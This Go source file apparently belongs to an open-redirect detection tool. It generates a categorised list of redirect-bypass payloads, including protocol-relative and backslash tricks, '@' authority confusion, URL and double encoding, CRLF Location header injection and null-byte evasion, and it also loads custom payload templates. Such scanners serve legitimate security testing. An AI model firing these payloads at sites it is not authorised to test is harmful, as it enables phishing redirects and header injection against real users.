package detector

import (
	"bufio"
	"fmt"
	"net/url"
	"os"
	"strings"
)

// PayloadDescriptor associates a payload with its evasion category.
type PayloadDescriptor struct {
	Value    string
	Category string
}

// GeneratePayloads produces a comprehensive, curated suite of Open Redirect payloads
// adapted to the target host and designated external test domain.
func GeneratePayloads(targetHost string, testDomain string, customFile string) ([]PayloadDescriptor, error) {
	if customFile != "" {
		return loadCustomPayloads(customFile, targetHost, testDomain)
	}

	if testDomain == "" {
		testDomain = "example.com"
	}

	// Clean targetHost
	cleanHost := targetHost
	if strings.Contains(cleanHost, ":") {
		cleanHost = strings.Split(cleanHost, ":")[0]
	}

	descriptors := []PayloadDescriptor{
		// 1. Standard Absolute URLs (Index 0 is the primary canary)
		{Value: fmt.Sprintf("https://%s", testDomain), Category: "Standard HTTPS"},
		{Value: fmt.Sprintf("http://%s", testDomain), Category: "Standard HTTP"},
		{Value: fmt.Sprintf("hTTps://%s", testDomain), Category: "Mixed-Case Scheme Normalization"},

		// 2. Protocol-Relative URLs
		{Value: fmt.Sprintf("//%s", testDomain), Category: "Protocol-Relative Double Slash"},
		{Value: fmt.Sprintf("///%s", testDomain), Category: "Protocol-Relative Triple Slash"},
		{Value: fmt.Sprintf("////%s", testDomain), Category: "Protocol-Relative Quadruple Slash"},
		{Value: fmt.Sprintf("/.//%s", testDomain), Category: "Dot-Slash Protocol-Relative"},

		// 3. Backslash Evasion
		{Value: fmt.Sprintf("/\\%s", testDomain), Category: "Backslash Obfuscation"},
		{Value: fmt.Sprintf("\\/%s", testDomain), Category: "Reverse Backslash Obfuscation"},
		{Value: fmt.Sprintf("\\\\%s", testDomain), Category: "Double Backslash (UNC/Windows)"},
		{Value: fmt.Sprintf("/\\/%s", testDomain), Category: "Slash-Backslash Alternation"},

		// 4. Userinfo / @ Authority Confusion
		{Value: fmt.Sprintf("https://%s@%s", cleanHost, testDomain), Category: "Authority Userinfo Bypass"},
		{Value: fmt.Sprintf("https://%s:%s@%s", cleanHost, cleanHost, testDomain), Category: "Authority Userinfo Credential Bypass"},
		{Value: fmt.Sprintf("https://%s#@%s", testDomain, cleanHost), Category: "Hash Anchor Authority Confusion"},
		{Value: fmt.Sprintf("https://%s?@%s", testDomain, cleanHost), Category: "Query Parameter Authority Confusion"},

		// 5. Dot-Segment / Path Traversal
		{Value: fmt.Sprintf("/../%s", testDomain), Category: "Dot-Segment Directory Traversal"},
		{Value: fmt.Sprintf("/%%2e%%2e/%s", testDomain), Category: "Encoded Dot-Segment Traversal"},
		{Value: fmt.Sprintf("/..//%s", testDomain), Category: "Double Traversal Protocol Confusion"},

		// 6. Single & Scheme URL Encoding
		{Value: fmt.Sprintf("%%2f%%2f%s", testDomain), Category: "URL-Encoded Protocol-Relative"},
		{Value: fmt.Sprintf("https:%%2f%%2f%s", testDomain), Category: "Encoded Slashes Scheme Bypass"},
		{Value: fmt.Sprintf("%%68%%74%%74%%70%%73%%3a%%2f%%2f%s", testDomain), Category: "Fully URL-Encoded HTTPS"},

		// 7. Double URL Encoding
		{Value: fmt.Sprintf("%%252f%%252f%s", testDomain), Category: "Double URL-Encoded Protocol-Relative"},
		{Value: fmt.Sprintf("https:%%252f%%252f%s", testDomain), Category: "Double Encoded Scheme Slashes"},

		// 8. CRLF Header Injection
		{Value: fmt.Sprintf("/%%0d%%0aLocation:%%20https://%s", testDomain), Category: "CRLF Location Header Injection"},

		// 9. Parameter Termination & Whitespace Evasion
		{Value: fmt.Sprintf("https://%s%%00", testDomain), Category: "Null Byte String Termination"},
		{Value: fmt.Sprintf("https://%s%%09", testDomain), Category: "Tab Character Obfuscation"},
		{Value: fmt.Sprintf("https://%s%%20", testDomain), Category: "Trailing Space Evasion"},
		{Value: fmt.Sprintf("https://%s.", testDomain), Category: "FQDN Trailing Dot Bypass"},
		{Value: fmt.Sprintf("https://%s/.", testDomain), Category: "Trailing Dot-Segment"},
	}

	return descriptors, nil
}

// loadCustomPayloads reads user-supplied payloads from a file and interpolates placeholders.
func loadCustomPayloads(filePath, targetHost, testDomain string) ([]PayloadDescriptor, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open custom payload file %q: %w", filePath, err)
	}
	defer file.Close()

	var list []PayloadDescriptor
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Interpolate template placeholders if present
		interpolated := strings.ReplaceAll(line, "{DOMAIN}", testDomain)
		interpolated = strings.ReplaceAll(interpolated, "{TARGET}", targetHost)

		list = append(list, PayloadDescriptor{
			Value:    interpolated,
			Category: "Custom Payload",
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading custom payload file: %w", err)
	}

	return list, nil
}

// ExtractHost extracts the hostname from a raw URL.
func ExtractHost(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return parsed.Hostname()
}
